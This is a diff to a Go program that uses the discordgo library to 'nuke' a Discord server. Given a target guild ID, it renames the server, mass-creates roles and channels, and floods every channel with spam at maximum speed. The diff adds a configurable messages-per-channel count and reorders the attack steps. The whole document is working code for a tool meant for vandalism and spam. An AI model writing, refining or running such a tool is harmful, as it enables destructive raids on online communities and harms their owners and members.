@@ -17,13 +17,13 @@ import (
 )
 
 const (
-	RESET      = "\033[0m"
-	BOLD       = "\033[1m"
+	RESET        = "\033[0m"
+	BOLD         = "\033[1m"
 	CLEAR_SCREEN = "\033[2J\033[H"
-	CLEAR_LINE   = "\033[2K\r"
 	HIDE_CURSOR  = "\033[?25l"
 	SHOW_CURSOR  = "\033[?25h"
 )
+
 var GRADIENT = []int{196, 202, 208, 214, 220, 226, 190, 154, 118, 82, 46, 47, 48, 49, 50, 51, 45, 39, 33, 27, 21, 57, 93, 129, 165, 201, 200, 199, 198, 197}
 
 var gradPos int
@@ -54,11 +54,6 @@ func gradientString(s string) string {
 	}
 	b.WriteString(RESET)
 	return b.String()
-}
-
-func gradientColor(s string) string {
-	c := nextColor()
-	return fmt.Sprintf("\033[38;5;%dm%s%s", c, s, RESET)
 }
 
 func logOK(action, detail string) {
@@ -233,7 +228,7 @@ func main() {
 	logInfo("[+] Message content loaded from me.txt")
 
 	fmt.Println()
-	logInfo(" ")
+	logInfo("")
 	fmt.Println()
 
 	guildID := logQuestion("Enter target Guild ID: ")
@@ -247,6 +242,8 @@ func main() {
 	channelNames := loadChannelNames()
 	logInfo(fmt.Sprintf("[+] Loaded %d base channel names from ch.txt", len(channelNames)))
 
+	messagesPerChannel := logIntQuestion("Enter messages per channel: ")
+
 	roleName := logQuestion("Enter role name: ")
 	roleCount := logIntQuestion("Enter number of roles to create: ")
 	roleColor := logHexQuestion("Enter role color (hex, e.g., DC143C): ")
@@ -258,6 +255,7 @@ func main() {
 	logInfo("=== Summary ===")
 	logInfo(fmt.Sprintf("[i] Guild ID: %s", guildID))
 	logInfo(fmt.Sprintf("[i] Channels: %d", channelCount))
+	logInfo(fmt.Sprintf("[i] Messages/Channel: %d", messagesPerChannel))
 	logInfo(fmt.Sprintf("[i] Roles: %d x %s", roleCount, roleName))
 	logInfo(fmt.Sprintf("[i] Role Color: #%06X", roleColor))
 	logInfo(fmt.Sprintf("[i] Server Name: %s", serverName))
@@ -276,7 +274,7 @@ func main() {
 
 	dg.AddHandler(func(s *discordgo.Session, r *discordgo.Ready) {
 		logInfo(fmt.Sprintf("[+] %s is connected!", r.User.Username))
-		go nukeGuild(s, guildID, serverName, iconURL, roleName, roleCount, roleColor, channelCount, channelNames, messageContent)
+		go nukeGuild(s, guildID, serverName, iconURL, roleName, roleCount, roleColor, channelCount, messagesPerChannel, channelNames, messageContent)
 	})
 
 	err = dg.Open()
@@ -291,10 +289,10 @@ func main() {
 	select {}
 }
 
-func nukeGuild(s *discordgo.Session, guildID, serverName, iconURL, roleName string, roleCount, roleColor, channelCount int, channelNames []string, messageContent string) {
+func nukeGuild(s *discordgo.Session, guildID, serverName, iconURL, roleName string, roleCount, roleColor, channelCount, messagesPerChannel int, channelNames []string, messageContent string) {
 	startTime := time.Now()
 	fmt.Println()
-	logInfo("=== NUKE STARTED ===")
+	logInfo("nuke start")
 	fmt.Println()
 
 	logInfo("[i] Changing server name and icon...")
@@ -373,38 +371,15 @@ func nukeGuild(s *discordgo.Session, guildID, serverName, iconURL, roleName stri
 	}
 	emojiWg.Wait()
 
-	if roleCount > 0 {
-		logInfo(fmt.Sprintf("[i] Creating %d roles...", roleCount))
-		roleColorVal := roleColor
-		var roleCreateWg sync.WaitGroup
-		for i := 0; i < roleCount; i++ {
-			roleCreateWg.Add(1)
-			go func(idx int) {
-				defer roleCreateWg.Done()
-				_, err := s.GuildRoleCreate(guildID, &discordgo.RoleParams{
-					Name:        roleName,
-					Color:       &roleColorVal,
-					Hoist:       boolPtr(true),
-					Mentionable: boolPtr(true),
-				})
-				if err != nil {
-					logFAIL("role make", err.Error())
-				} else {
-					logOK("role make", roleName)
-				}
-			}(i)
-		}
-		roleCreateWg.Wait()
-	}
-
+	var createdChannels []*discordgo.Channel
 	if channelCount > 0 {
-		logInfo(fmt.Sprintf("[i] Creating %d channels...", channelCount))
+		logInfo(fmt.Sprintf("[i] Creating %d channels at MAXIMUM SPEED...", channelCount))
 		preGeneratedNames := make([]string, channelCount)
 		for i := 0; i < channelCount; i++ {
 			preGeneratedNames[i] = generateChannelName(channelNames)
 		}
 
-		createdChannels := make([]*discordgo.Channel, 0, channelCount)
+		createdChannels = make([]*discordgo.Channel, 0, channelCount)
 		var chMu sync.Mutex
 		var chCreateWg sync.WaitGroup
 
@@ -428,15 +403,18 @@ func nukeGuild(s *discordgo.Session, guildID, serverName, iconURL, roleName stri
 		}
 		chCreateWg.Wait()
 		logInfo(fmt.Sprintf("[+] Created %d/%d channels!", len(createdChannels), channelCount))
+	}
 
-		if len(createdChannels) > 0 {
-			logInfo("[i] Sending messages to all channels...")
-			var msgWg sync.WaitGroup
-			msgSuccess := 0
-			msgErr := 0
-			var msgMu sync.Mutex
+	if messagesPerChannel > 0 && len(createdChannels) > 0 {
+		totalMsgs := len(createdChannels) * messagesPerChannel
+		logInfo(fmt.Sprintf("[i] Sending %d messages at MAXIMUM SPEED...", totalMsgs))
+		var msgWg sync.WaitGroup
+		msgSuccess := 0
+		msgErr := 0
+		var msgMu sync.Mutex
 
-			for _, ch := range createdChannels {
+		for _, ch := range createdChannels {
+			for i := 0; i < messagesPerChannel; i++ {
 				msgWg.Add(1)
 				go func(cID string) {
 					defer msgWg.Done()
@@ -454,9 +432,33 @@ func nukeGuild(s *discordgo.Session, guildID, serverName, iconURL, roleName stri
 					}
 				}(ch.ID)
 			}
-			msgWg.Wait()
-			logInfo(fmt.Sprintf("[+] Sent %d messages (errors: %d)!", msgSuccess, msgErr))
 		}
+		msgWg.Wait()
+		logInfo(fmt.Sprintf("[+] Sent %d/%d messages (errors: %d)!", msgSuccess, totalMsgs, msgErr))
+	}
+
+	if roleCount > 0 {
+		logInfo(fmt.Sprintf("[i] Creating %d roles...", roleCount))
+		roleColorVal := roleColor
+		var roleCreateWg sync.WaitGroup
+		for i := 0; i < roleCount; i++ {
+			roleCreateWg.Add(1)
+			go func(idx int) {
+				defer roleCreateWg.Done()
+				_, err := s.GuildRoleCreate(guildID, &discordgo.RoleParams{
+					Name:        roleName,
+					Color:       &roleColorVal,
+					Hoist:       boolPtr(true),
+					Mentionable: boolPtr(true),
+				})
+				if err != nil {
+					logFAIL("role make", err.Error())
+				} else {
+					logOK("role make", roleName)
+				}
+			}(i)
+		}
+		roleCreateWg.Wait()
 	}
 
 	logInfo("[i] Sending embed to rules channel...")
@@ -493,7 +495,7 @@ func nukeGuild(s *discordgo.Session, guildID, serverName, iconURL, roleName stri
 	}
 
 	fmt.Println()
-	logInfo(" ")
+	logInfo("")
 	logInfo(fmt.Sprintf("[+] Total execution time: %v", time.Since(startTime)))
 	fmt.Println()
 }
